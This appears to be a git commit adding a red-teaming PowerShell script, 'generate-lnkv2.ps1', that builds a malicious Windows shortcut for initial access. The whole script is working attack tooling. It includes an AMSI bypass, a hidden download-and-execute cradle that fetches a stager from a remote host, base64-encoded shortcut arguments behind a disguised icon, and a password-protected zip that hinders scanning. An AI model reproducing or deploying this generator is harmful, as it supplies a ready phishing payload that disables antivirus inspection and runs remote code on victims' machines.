34320f07a33e1a1812c1ede2b439bd1a53c15f36
e1n <69242462+du4L5ynchE1n@users.noreply.github.com>
2023-08-04 01:22:58 +0800

    Create generate-lnkv2.ps1

---
+++ red teaming/initial access/generate-lnkv2.ps1
@@ -0,0 +1,27 @@
+#For executables as stagers 
+#Malicious powershell commands
+$amsibypass = '$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields("NonPublic,Static");Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}}$f.SetValue($null,$true);'
+$url = "http://10.211.55.2:8080/stager.ps1"
+$loader = "iex(new-object system.net.webclient).downloadstring('$url');"
+$payload = $amsibypass + $loader
+$enc_payload = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
+
+#shortcut file commands
+$path = "$([Environment]::GetFolderPath('Desktop'))\demo.lnk"
+$wshell = New-Object -ComObject Wscript.Shell
+$shortcut = $wshell.CreateShortcut($path)
+$shortcut.IconLocation = "C:\Windows\System32\shell32.dll,70"
+$shortcut.TargetPath = "powershell.exe"
+$shortcut.Arguments = "-nop -w hidden -enc " + $enc_payload
+$shortcut.WorkingDirectory = "C:"
+$shortcut.Hotkey = "CTRL+C"
+$shortcut.Description = "Demo"
+$shortcut.WindowStyle = 7 
+$shortcut.Save()
+
+#7zip encryption commands
+$password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
+Compress-7zip -Path $path -ArchiveFileName "demo.zip" -Format Zip - SecurePassword $password
+
+#Cleanup of lnk file
+rm $path
